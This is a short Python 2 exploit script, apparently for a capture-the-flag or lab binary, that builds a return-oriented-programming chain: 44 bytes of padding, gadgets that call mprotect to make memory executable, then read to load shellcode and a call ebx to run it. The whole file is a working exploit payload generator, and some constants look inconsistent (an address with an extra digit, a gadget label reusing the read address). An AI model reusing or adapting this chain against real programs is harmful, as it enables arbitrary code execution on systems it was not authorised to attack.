#! /usr/bin/python
import struct

def p(x):
	return struct.pack('<L',x)

#mprotect address
mprotect=0x08052290
#read address
read=0x0080516a0
open=0x080515f0

mem=0x080c9fff


payload=""

#Padding to reach return address
for i in range(0,44):
	payload+="A"

#MPROTECT:
	#EDX=0x00000007
	#ECX=0x01010101
	#EBX=0x080ca000

payload+=p(0x08052476)		#pop edx; ret
payload+=p(0xFFFFFFFF)		#edx=0xFFFFFFFF 
payload+=p(0x0808f4f4)		#inc edx; ret
payload+=p(0x0808f4f4)		#inc edx; ret
payload+=p(0x0808f4f4)		#inc edx; ret
payload+=p(0x0808f4f4)		#inc edx; ret
payload+=p(0x0808f4f4)		#inc edx; ret
payload+=p(0x0808f4f4)		#inc edx; ret
payload+=p(0x0808f4f4)		#inc edx; ret
payload+=p(0x0808f4f4)		#inc edx; ret
				#now edx=0x7
payload+=p(0x0805249d)		#pop ecx; pop ebx; ret
payload+=p(0x01010101)		
payload+=p(mem)
payload+=p(0x08082cb0)		#inc ebx;ret
payload+=p(0x0805229d)		#mprotect

payload+=p(0xffffffff)		#DUMMY


#read
	#EDX=0x01010101
	#ECX=0x080ca000
	#EBX=0x00000000

payload+=p(0x08052476)		#pop edx; ret
payload+=p(0x01010101)		#edx=0x01010101

payload+=p(0x0805249d)		#pop ecx; pop ebx; ret
payload+=p(mem)
payload+=p(0xffffffff)
payload+=p(0x08083c16)		#inc ecx; ret;
payload+=p(0x08082cb0)		#inc ebx; ret;

payload+=p(0x080516b7)		#read; ret

#call eax
payload+=p(0xffffffff)		#DUMMY
payload+=p(0x080516b7)		#pop ebx; ret
payload+=p(mem)			#eax
payload+=p(0x08082cb0)		#inc ebx; ret
payload+=p(0x0806a853)		#call ebx

payload+="DEAD"

print payload
